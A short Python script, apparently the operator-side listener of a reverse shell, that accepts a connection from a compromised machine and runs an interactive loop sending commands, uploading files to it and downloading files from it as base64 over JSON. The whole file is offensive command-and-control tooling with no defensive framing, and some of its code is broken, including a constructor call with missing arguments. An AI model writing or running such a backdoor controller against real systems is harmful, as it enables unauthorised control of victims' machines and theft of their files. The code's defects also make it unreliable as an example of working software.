#! /usr/bin/evn python

import socket
import simplejson
import base64


class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, int(port)))
        listener.listen(0)
        print("[+] waiting for connection")
        self.connection, address = listener.accept()
        print("[+] got a connection from " + str(address))

    def json_sent(self, data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode())

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode("utf-8")
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content.encode()))
            return "[+] download file successfully"

    def execute_command(self, command):
        self.json_sent(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.json_receive()

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    content = self.read_file(command[1])
                    command.append(content)
                result = self.execute_command(command)
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error"
            print(result)



ip = "127.0.0.1" #Enter Ip address
port = "1234" #port
my_listener = Listener()
my_listener.run()
